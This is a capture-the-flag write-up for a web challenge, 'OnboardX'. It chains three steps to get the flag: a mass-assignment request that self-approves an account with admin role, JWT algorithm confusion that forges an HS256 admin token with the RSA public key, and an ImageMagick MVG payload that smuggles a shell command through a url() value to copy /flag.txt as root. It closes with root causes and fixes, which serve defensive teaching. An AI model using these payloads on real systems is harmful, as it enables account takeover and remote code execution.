# OnboardX — Complete Solution Writeup

## Challenge information

| Field | Value |
|---|---|
| Challenge | OnboardX |
| Category | Web |
| Points | 30 |
| Target | `https://kicyber-67e68bada969-onboardx-0-0.chals.io` |
| Objective | Obtain the flag from the application |

## Flag

```text
KPMG_CTF{aQUhfj8rvs240qLr7QZcMmhTRpRyssqXjvvgWRQv_zk}
```

## Overview

The application presents itself as an employee onboarding portal. New accounts are
supposed to remain pending until HR approves them. Once approved, an employee can
upload an ID-card photograph, while administrators can generate official ID cards
from uploaded images.

The intended route is a chain of three vulnerabilities:

1. Profile mass assignment allows a pending user to approve the account and change
   the stored role.
2. JWT algorithm confusion allows an administrator token to be forged using the
   published RSA public key.
3. The administrator's ImageMagick processing pipeline is vulnerable to command
   injection through an MVG-style image payload.

The command execution is then used to copy `/flag.txt` into the public static
directory.

## 1. Reconnaissance

The public API documentation is available at:

```text
GET /api
```

It identifies the following user-facing endpoints:

```text
GET   /.well-known/jwks.json
GET   /api/user/me
PATCH /api/user/me
GET   /settings/export
```

The documentation also states that administrative endpoints are intentionally
not listed and must be discovered through the user interface.

The public key endpoint returns a JWKS containing an RSA verification key:

```text
GET /.well-known/jwks.json
```

The relevant key properties include:

```json
{
  "alg": "RS256",
  "kid": "prod-rsa-key-2026",
  "kty": "RSA",
  "use": "sig"
}
```

The registration page says that HR approval normally takes 48 hours. That makes
the challenge hint — “if you can onboard yourself, why do u need an HR/Admin” —
point directly at the account approval logic.

## 2. Creating an account

A normal account can be created through:

```text
POST /register
```

After logging in, a pending account receives a signed session cookie rather than
an approved employee JWT. The profile API confirms the initial state:

```json
{
  "id": 4,
  "username": "ctfuser20261010b",
  "is_approved": false,
  "role": "user",
  "avatar_path": ""
}
```

## 3. Bypassing HR approval

The profile-update endpoint accepts fields beyond those exposed by the profile
form. It does not enforce a strict allowlist of user-editable properties.

The following request changes both the approval state and the stored role:

```http
PATCH /api/user/me
Content-Type: application/json

{
  "is_approved": true,
  "role": "admin"
}
```

The server accepts the update and returns:

```json
{
  "id": 4,
  "username": "ctfuser20261010b",
  "is_approved": true,
  "role": "admin"
}
```

The account is now approved, so logging in again produces an employee JWT.
However, the token still contains:

```json
{
  "sub": 4,
  "username": "ctfuser20261010b",
  "role": "user"
}
```

This happens because the login code mints the role claim using a fixed
non-privileged default. Therefore, changing the database role alone is not
enough to access the administrator panel.

## 4. Forging an administrator JWT

The JWT header issued by the server uses RSA signing:

```json
{
  "alg": "RS256",
  "kid": "prod-rsa-key-2026",
  "typ": "JWT"
}
```

The verifier accepts the algorithm from the token instead of enforcing that it
must be `RS256`. This creates an algorithm-confusion condition:

- the server normally verifies an RSA signature using the public key;
- a forged token changes the algorithm to `HS256`;
- the same public key is then treated as the HMAC secret;
- anyone who can download the JWKS can create a valid-looking administrator JWT.

### Important key-format detail

The HMAC secret must be the exact PEM text generated for the RSA public key in
SubjectPublicKeyInfo format. The successful representation has:

- `-----BEGIN PUBLIC KEY-----`
- base64-encoded DER SubjectPublicKeyInfo data
- 64-character line wrapping
- a final newline
- `-----END PUBLIC KEY-----`

Using DER bytes directly, PKCS#1 formatting, or a different PEM wrapping causes
the forged token to be rejected.

The forged claims used for the administrator session were equivalent to:

```json
{
  "sub": 4,
  "username": "ctfuser20261010b",
  "role": "admin",
  "iat": 1791654230,
  "exp": 1791675830
}
```

The token was signed as:

```text
HS256(public-key-PEM)
```

The resulting token successfully authenticated against:

```text
GET /admin
```

## 5. Discovering the administrator action

The administrator page is an HR review queue. It lists registered employees and
contains a client-side function that reveals the internal action:

```javascript
function genIDCard(id, btn) {
  fetch(`/admin/idcard/${id}`, { method: 'POST' })
}
```

Therefore, for account ID `4`, the generation request is:

```http
POST /admin/idcard/4
```

The response identifies the image-processing backend through this header:

```text
X-Powered-By: ImageMagick/6
```

The upload endpoint is:

```text
POST /profile
```

with a multipart field named `avatar`.

The upload check only looks at the leading image signature. It does not fully
decode and validate the image before storing it. This permits a file beginning
with `GIF89a` to contain MVG instructions after the apparent image header.

## 6. ImageMagick command injection

The processing path is susceptible to the ImageTragick-era MVG delegate issue.
The vulnerable `url()` value reaches a shell-backed delegate without safe
escaping. A quote and pipe can terminate the intended argument and append a
command.

A working payload structure was:

```text
GIF89a
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|cat /flag.txt > /app/app/static/onboardx-final.txt" )'
pop graphic-context
```

The payload was uploaded as an image file, then processing was triggered with:

```text
POST /admin/idcard/4
```

The response's first-stage ImageMagick diagnostic still reported an image
decoding error. That message is misleading because the vulnerable command is
executed by a later internal processing step. The reliable indicator is the
side effect in the public static directory.

Command execution was independently confirmed first with:

```text
uid=0(root) gid=0(root) groups=0(root)
```

The objective file was then copied to a web-accessible path:

```text
/app/app/static/onboardx-final.txt
```

It could be retrieved with:

```text
GET /static/onboardx-final.txt
```

## 7. Result

The response body contained:

```text
KPMG_CTF{aQUhfj8rvs240qLr7QZcMmhTRpRyssqXjvvgWRQv_zk}
```

## Root causes

### Unsafe profile updates

The profile endpoint applies arbitrary fields from the JSON object. Approval and
role are security-sensitive fields and must never be writable by the account
owner.

### Algorithm confusion

JWT verification accepts multiple algorithms for the same key material. The
verification routine must pin the expected algorithm and key type, for example
accepting only `RS256` with the configured RSA public key.

### Unsafe image processing

The upload filter trusts a magic-byte prefix, and the subsequent ImageMagick
pipeline exposes dangerous delegate behavior. Image files should be fully
decoded and re-encoded using a minimal image library, with risky ImageMagick
coders and delegates disabled.

### Excessive process privileges

The image-processing operation ran with root privileges. Even if a command
injection were to occur, the worker should run as a restricted, unprivileged
user inside a sandbox.

## Recommended fixes

1. Allow users to edit only explicitly approved profile fields.
2. Keep approval and role changes inside a privileged HR workflow.
3. Require `RS256` explicitly during JWT verification.
4. Verify the JWT key type and algorithm match before validating signatures.
5. Fully decode and re-encode uploaded images before further processing.
6. Disable MVG, MSL, URL, and other unnecessary ImageMagick coders/delegates.
7. Never construct shell commands from user-controlled image data.
8. Run image processing as a low-privilege isolated worker.
9. Store generated files outside directly web-served paths unless they are
   intentionally public and access-controlled.
